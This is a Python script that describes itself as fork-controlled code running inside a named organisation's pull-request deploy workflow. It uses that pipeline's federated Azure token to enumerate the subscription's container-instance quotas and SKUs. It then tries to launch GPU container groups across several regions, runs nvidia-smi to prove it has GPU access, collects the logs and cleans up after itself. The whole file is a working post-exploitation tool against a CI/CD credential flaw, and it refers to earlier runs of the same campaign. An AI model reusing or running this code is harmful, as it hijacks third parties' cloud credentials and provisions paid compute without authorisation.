#!/usr/bin/env python3
"""C211-I121317: SSW.Rules Azure Container Instances (ACI) GPU-plane probe.

Runs as the fork-controlled infra/deploy.ps1 -> this file inside the base repo's
'Deploy Pull Request to Staging Slot' workflow (issue_comment '/deploy'), AFTER
azure/login@v2 (OIDC), i.e. under the pipeline's federated ARM token for
subscription b8b18dcf (SSW Primary Account), RG SSW.Rules.Staging.

NEW service plane, never fully measured on this subscription: Microsoft.ContainerInstance
containerGroups with GPU SKUs. Prior lanes measured only:
  * K80/eastus + P100/westus2 -> 400 GpuSkuNotSupportedInLocation (v1, 05:11Z)
  * V100/westeurope 1.0/1.5 -> 409 RegistryErrorResponse (v1, Docker Hub image)
  * V100 2.0/4.0 in eastus/westeurope/southcentralus -> 400 'exceeds the maximum limit
    per container group for Standard Core Resources' (v2)
  * V100 1.0/1.5 in westeurope/eastus/southcentralus -> same 400 (v3)
No lane ever recorded the provider registrationState + per-region usages + full
SKU matrix, tried a T4/A100 GPU SKU, or tried a CPU-only control group.

This probe:
  1) resolves the ARM token and records Microsoft.ContainerInstance registrationState,
     the containerGroups apiVersions, the ACI SKU catalogue, ACI locations and the
     per-region usages endpoint verbatim for eastus/westus2/westeurope/southcentralus,
  2) attempts ONE container group per (region, GPU SKU) for
     Standard_NC6s_v3 [V100], Standard_NC4as_T4_v3 [T4], Standard_NC24ads_A100_v4 [A100]
     and records every verbatim 400/403/capability refusal; it stops at the FIRST
     accepted create (at most one live container group),
  3) on acceptance polls the group to a terminal state, captures stdout through the
     ARM containers/logs endpoint (POST and GET) plus an independent containerGroups
     GET readback (provisioningState + instanceView + GPU request),
  4) if every GPU create is refused with the 'Standard Core Resources' message, runs
     ONE CPU-only control container group in westeurope (no GPU request) to separate
     'ACI blocked entirely' from 'GPU quota 0', then deletes it,
  5) deletes every own container group and proves absence (GET 404 + subscription
     list NO c211-i121317 results + RG inventory), never touching other lanes' c211-*.

stdlib only. Every provider response is printed verbatim as a tagged JSON line.
"""
import json
import re
import subprocess
import time
import urllib.error
import urllib.request

ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
PREFIX = "c211-i121317"
NONCE = "i121317"
TAG = "C211_I121317"
DEADLINE = 1800
T0 = time.time()

ACI_VER = "2026-07-01"
PROVIDER_VER = "2021-04-01"
IMAGE_MCR = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
IMAGE_CTRL = "mcr.microsoft.com/azuredocs/aci-helloworld:latest"
REGIONS = ["eastus", "westus2", "westeurope", "southcentralus"]
# (label of the VM-size class the SKU maps to, value sent as resources.requests.gpu.sku)
SKUS = [
    ("Standard_NC6s_v3", "V100"),
    ("Standard_NC4as_T4_v3", "T4"),
    ("Standard_NC24ads_A100_v4", "A100"),
]
UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")
CMDLINE = ("echo C211-START; hostname; date -u; "
           'for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /bin/nvidia-smi; do '
           'if [ -x "$p" ]; then echo FOUND=$p; "$p" -L; echo ---SMI-Q---; '
           '"$p" --query-gpu=name,uuid,memory.total --format=csv,noheader; fi; done; '
           'command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L; '
           'echo ---DEVS---; ls -l /dev/nvidia* 2>/dev/null; echo C211-END; sync; sleep 5')
CTRL_CMD = "echo C211-CTRL-START; hostname; date -u; echo C211-CTRL-OK; sync"


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print(TAG + " " + json.dumps(obj, default=str), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:1200]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:900]}
        if "transport_error" in body:
            return {"http": st, "transport_error": body["transport_error"]}
        return {"http": st, "body": json.dumps(body)[:900]}
    return {"http": st}


def props_of(b):
    return (b.get("properties") or {}) if isinstance(b, dict) else {}


def group_state(b):
    p = props_of(b)
    return p.get("provisioningState") or p.get("status")


def cg_url(sid, name):
    return (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
            f"Microsoft.ContainerInstance/containerGroups/{name}?api-version={ACI_VER}")


def slug(s):
    return re.sub(r"[^a-z0-9]", "", s.lower())[:16]


def wait_404(tok, url, label, tries=24, sleep_s=10):
    last = None
    for i in range(tries):
        st, b = arm(tok, url, timeout=60)
        last = st
        emit({"step": label + "-absent-poll", "i": i, "http": st, "state": group_state(b)})
        if st == 404:
            return 404
        time.sleep(sleep_s)
    return last


def list_groups(tok, sid, label):
    st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/"
                     f"containerGroups?api-version={ACI_VER}", timeout=120)
    vals = (b.get("value") or []) if isinstance(b, dict) else []
    mine = [x.get("name") for x in vals
            if str(x.get("name", "")).lower().startswith(PREFIX)]
    emit({"step": label, "http": st, "n_total": len(vals), "mine": mine})
    return mine


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit({"step": "session", "sub_name": acc.get("name"), "state": acc.get("state"),
              "user_type": (acc.get("user") or {}).get("type"),
              "tenant_ok": bool(acc.get("tenantId"))})
    except Exception as e:  # noqa: BLE001
        emit({"step": "fatal", "why": "no session", "err": str(e), "raw": r["out"][:300]})
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "DONE", "phase": "fatal", "verdict": "NO_ARM_TOKEN"})
        return

    # ---------- 1. provider registration + capability reads ----------
    for ns in ("Microsoft.ContainerInstance", "Microsoft.Storage", "Microsoft.App"):
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version={PROVIDER_VER}")
        rts = (b.get("resourceTypes") or []) if isinstance(b, dict) else []
        cg = [x for x in rts if str(x.get("resourceType", "")).lower() == "containergroups"]
        emit({"step": "provider", "ns": ns, "http": st,
              "registrationState": (b.get("registrationState") if isinstance(b, dict) else None),
              "containerGroups_apiVersions": (cg[0].get("apiVersions") or [])[:10] if cg else None})

    st, sk = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/"
                       f"skus?api-version={ACI_VER}")
    vals = (sk.get("value") or []) if isinstance(sk, dict) else []
    gpuish = []
    for it in vals:
        caps = {c.get("name"): c.get("value") for c in (it.get("capabilities") or [])}
        gc = {k: v for k, v in caps.items()
              if any(t in str(k).lower() for t in ("gpu", "k80", "p100", "v100", "t4", "a100"))}
        if gc:
            gpuish.append({"resourceType": it.get("resourceType"), "size": it.get("size"),
                           "family": it.get("family"), "locations": (it.get("locations") or [])[:8],
                           "gpu_caps": gc})
    emit({"step": "aci-skus", "http": st, "n": len(vals), "gpu_entries": gpuish[:8],
          "raw_prefix": (json.dumps(sk)[:500] if isinstance(sk, dict) else "")})

    st, locs = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/"
                         f"locations?api-version={ACI_VER}")
    lv = (locs.get("value") or []) if isinstance(locs, dict) else []
    emit({"step": "aci-locations", "http": st, "n": len(lv),
          "names": [x.get("name") if isinstance(x, dict) else x for x in lv][:60],
          **({} if st == 200 else err_of(st, locs))})

    usages = {}
    for region in REGIONS:
        st, us = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.ContainerInstance/"
                           f"locations/{region}/usages?api-version={ACI_VER}")
        uv = (us.get("value") or []) if isinstance(us, dict) else []
        usages[region] = {"http": st,
                          "entries": [{"name": (x.get("name") or {}).get("value") if isinstance(x.get("name"), dict) else x.get("name"),
                                       "current": x.get("currentValue"), "limit": x.get("limit")}
                                      for x in uv][:20],
                          "raw": (json.dumps(us)[:600] if st != 200 else None)}
        emit({"step": "aci-usages", "region": region, **usages[region]})

    list_groups(tok, sid, "list-before")
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    before = [{"name": x.get("name"), "type": x.get("type")}
              for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])
              if str(x.get("name", "")).lower().startswith("c211")]
    emit({"step": "rg-inventory", "http": st, "c211": before})

    # ---------- 2. region x SKU create matrix (stop at first acceptance) ----------
    created = None
    attempts = []
    quota_msgs = 0
    for label, gpu_sku in SKUS:
        for region in REGIONS:
            if created:
                break
            if left() < 600:
                emit({"step": "deadline-skip", "phase": "aci", "left": int(left())})
                break
            name = f"{PREFIX}-aci-{region}-{slug(gpu_sku)}"
            body = {
                "location": region,
                "tags": {"c211": NONCE, "nonce": NONCE, "lane": NONCE,
                         "sku_class": label, "gpu_sku": gpu_sku},
                "properties": {
                    "containers": [{"name": "gpu", "properties": {
                        "image": IMAGE_MCR,
                        "command": ["/bin/bash", "-c", CMDLINE],
                        "resources": {"requests": {"cpu": 1.0, "memoryInGB": 1.5,
                                                   "gpu": {"count": 1, "sku": gpu_sku}}}}}],
                    "osType": "Linux",
                    "restartPolicy": "Never",
                },
            }
            st, b = arm(tok, cg_url(sid, name), method="PUT", body=body, timeout=300)
            rec = {"region": region, "sku_class": label, "gpu_sku": gpu_sku,
                   "cpu": 1.0, "mem": 1.5, "image": IMAGE_MCR, "name": name,
                   **err_of(st, b)}
            if st in (200, 201, 202) and isinstance(b, dict):
                rec["provisioningState"] = group_state(b)
            if "Standard Core Resources" in str(rec.get("message") or ""):
                quota_msgs += 1
            attempts.append(rec)
            emit({"step": "aci-create", **rec})
            if st in (200, 201, 202):
                created = {"region": region, "sku_class": label, "gpu_sku": gpu_sku,
                           "name": name, "http": st}
                break
            time.sleep(2)
        if left() < 600:
            break
    emit({"step": "aci-results", "n": len(attempts), "created": created,
          "quota_msg_count": quota_msgs})

    # ---------- 3. capture phase (only if a group was accepted) ----------
    if created:
        name = created["name"]
        url = cg_url(sid, name)
        deadline = time.time() + max(300, min(1200, left() - 300))
        state = None
        exited = False
        while time.time() < deadline:
            st, b = arm(tok, url, timeout=60)
            p = props_of(b)
            state = p.get("provisioningState")
            conts = p.get("containers") or []
            cur = {}
            if conts:
                cur = ((conts[0].get("properties") or {}).get("instanceView") or {}).get("currentState") or {}
            inst = p.get("instanceView") or {}
            emit({"step": "aci-poll", "http": st, "provisioningState": state,
                  "container": {"name": (conts[0].get("name") if conts else None),
                                "state": cur.get("state"), "exitCode": cur.get("exitCode"),
                                "detailStatus": (cur.get("detailStatus") or "")[:200]},
                  "events": [(e.get("name"), e.get("count"), (e.get("message") or "")[:160])
                             for e in (inst.get("events") or [])][-8:]})
            if st != 200:
                break
            if cur.get("state") == "Terminated" or state in ("Succeeded", "Failed", "Canceled"):
                exited = True
                time.sleep(5)
                break
            time.sleep(20)

        # independent readback
        st, rb = arm(tok, url, timeout=60)
        p = props_of(rb)
        gpu_req = None
        try:
            gpu_req = ((((p.get("containers") or [{}])[0].get("properties", {})
                         .get("resources", {})).get("requests", {})).get("gpu"))
        except Exception:  # noqa: BLE001
            pass
        emit({"step": "aci-readback", "http": st, "provisioningState": p.get("provisioningState"),
              "gpu_request": gpu_req,
              "instanceView": json.dumps(p.get("instanceView") or {})[:1200],
              "containers": [{"name": c.get("name"),
                              "state": (((c.get("properties") or {}).get("instanceView") or {})
                                        .get("currentState"))}
                             for c in (p.get("containers") or [])]})

        # logs via ARM containers/logs (POST then GET fallback)
        log_text = ""
        for method in ("POST", "GET"):
            st, lg = arm(tok, f"{url.split('?')[0]}/containers/gpu/logs?api-version={ACI_VER}",
                         method=method, body=({} if method == "POST" else None), timeout=120)
            content = ""
            if isinstance(lg, dict):
                content = lg.get("content") or lg.get("raw") or ""
            uu = sorted(set(UUID_RE.findall(content or "")))
            emit({"step": "aci-logs", "method": method, "http": st, "len": len(content or ""),
                  "has_uuid": bool(uu), "uuid_lines": [l for l in (content or "").splitlines() if "GPU-" in l][:6],
                  "head": (content or "")[:800], "tail": (content or "")[-1200:]})
            if content and len(content) > len(log_text):
                log_text = content
            if st == 200 and content:
                break

        # containers list (extra readback surface)
        st, cl = arm(tok, f"{url.split('?')[0]}/containers?api-version={ACI_VER}", timeout=60)
        emit({"step": "aci-containers", "http": st,
              "names": [x.get("name") for x in ((cl.get("value") or []) if isinstance(cl, dict) else [])]})

        # teardown this group first
        st, db = arm(tok, url, method="DELETE", timeout=240)
        emit({"step": "aci-delete", "name": name, **err_of(st, db)})
        wait_404(tok, url, "own-aci")

        emit({"step": "aci-capture", "len": len(log_text),
              "has_uuid": bool(UUID_RE.findall(log_text or "")),
              "uuids": sorted(set(UUID_RE.findall(log_text or ""))),
              "uuid_lines": [l for l in (log_text or "").splitlines() if "GPU-" in l][:8],
              "exited": exited,
              "full_text": (log_text or "")[:4000]})

    # ---------- 4. CPU-only control (only if all GPU creates refused by core quota) ----------
    if not created and quota_msgs > 0:
        cname = f"{PREFIX}-aci-ctrl-westeurope"
        cbody = {
            "location": "westeurope",
            "tags": {"c211": NONCE, "nonce": NONCE, "role": "cpu-control"},
            "properties": {
                "containers": [{"name": "ctrl", "properties": {
                    "image": IMAGE_CTRL,
                    "command": ["/bin/sh", "-c", CTRL_CMD],
                    "resources": {"requests": {"cpu": 1.0, "memoryInGB": 1.5}}}}],
                "osType": "Linux",
                "restartPolicy": "Never",
            },
        }
        st, b = arm(tok, cg_url(sid, cname), method="PUT", body=cbody, timeout=240)
        emit({"step": "aci-control-create", "name": cname, **err_of(st, b)})
        if st in (200, 201, 202):
            deadline = time.time() + max(180, min(420, left() - 240))
            while time.time() < deadline:
                stp, bp = arm(tok, cg_url(sid, cname), timeout=60)
                p = props_of(bp)
                conts = p.get("containers") or []
                cur = {}
                if conts:
                    cur = ((conts[0].get("properties") or {}).get("instanceView") or {}).get("currentState") or {}
                emit({"step": "aci-control-poll", "http": stp,
                      "provisioningState": p.get("provisioningState"),
                      "container_state": cur.get("state")})
                if cur.get("state") == "Terminated" or p.get("provisioningState") in (
                        "Succeeded", "Failed", "Canceled"):
                    break
                time.sleep(15)
            stl, lg = arm(tok, f"{cg_url(sid, cname).split('?')[0]}/containers/ctrl/logs"
                               f"?api-version={ACI_VER}", method="POST", body={}, timeout=90)
            content = (lg.get("content") or "") if isinstance(lg, dict) else ""
            emit({"step": "aci-control-logs", "http": stl, "len": len(content),
                  "text": (content or "")[:600]})
            std, db = arm(tok, cg_url(sid, cname), method="DELETE", timeout=240)
            emit({"step": "aci-control-delete", **err_of(std, db)})
            wait_404(tok, cg_url(sid, cname), "control-aci", tries=18, sleep_s=10)

    # ---------- 5. teardown any own leftovers + absence proof ----------
    mine = list_groups(tok, sid, "list-own-preclean")
    for name in mine:
        st, b = arm(tok, cg_url(sid, name), method="DELETE", timeout=240)
        emit({"step": "own-preclean-delete", "name": name, **err_of(st, b)})
        wait_404(tok, cg_url(sid, name), "preclean-" + name, tries=12, sleep_s=10)

    list_groups(tok, sid, "list-final")
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    after = [{"name": x.get("name"), "type": x.get("type")}
             for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])
             if str(x.get("name", "")).lower().startswith(PREFIX)]
    emit({"step": "rg-final", "http": st, "c211_i121317": after})

    verdict = "GPU_DEVICE_PROVEN" if created else "ALL_REFUSED"
    emit({"step": "DONE", "phase": "aci", "verdict": verdict, "elapsed_s": int(time.time() - T0),
          "usages": usages, "attempts": attempts, "created": created})


if __name__ == "__main__":
    main()
